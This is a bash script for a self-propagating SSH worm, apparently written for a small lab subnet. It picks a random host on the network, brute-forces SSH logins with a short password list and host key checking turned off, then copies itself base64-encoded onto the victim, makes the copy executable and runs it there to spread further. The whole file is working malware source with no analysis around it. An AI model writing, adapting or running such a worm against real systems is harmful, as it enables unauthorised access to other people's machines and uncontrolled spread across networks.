#!/bin/bash

# Variables to complete (i.e. IP addressing scheme and worm location)
IP_SUBNET="10.0.0."
MIN_HOST=1
MAX_HOST=6
WORM="$0"


# Data to use in the brute force attack
USER="test"
PASSWORDS=("user" "test" "admin")


# Other variables
NUM_HOSTS=`expr $MAX_HOST - $MIN_HOST + 1`
MY_IP="`hostname -I`"
IPS=()
SEED=`expr $RANDOM % $NUM_HOSTS`
ENCODED=`cat $WORM | base64`


# Creation of the IPv4 addresses of the hosts
for HOST in $(seq $MIN_HOST $MAX_HOST)
do
	IPS+=("${IP_SUBNET}${HOST}")
done


# Randomly choose the target, but it cannot be the attacker
IP=${IPS[$SEED]}
if [ $IP = $MY_IP ]; then
	SEED=`expr $SEED + 1`
	SEED=`expr $SEED % $NUM_HOSTS`
	IP=${IPS[$SEED]}
fi
echo "The target IP is $IP"


# Brute force against the other hosts
for PASS in "${PASSWORDS[@]}"
do
	echo "Trying user = $USER with password = $PASS"
	sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@$IP "echo \"$ENCODED\" | base64 -d > \$HOME/$WORM ; chmod +x \$HOME/$WORM ; sleep 10s ; ./$WORM" # 2> /dev/null
	if [ $? -eq 0 ]; then
	    echo "OK"
	else
	    echo "FAIL"
	fi
done




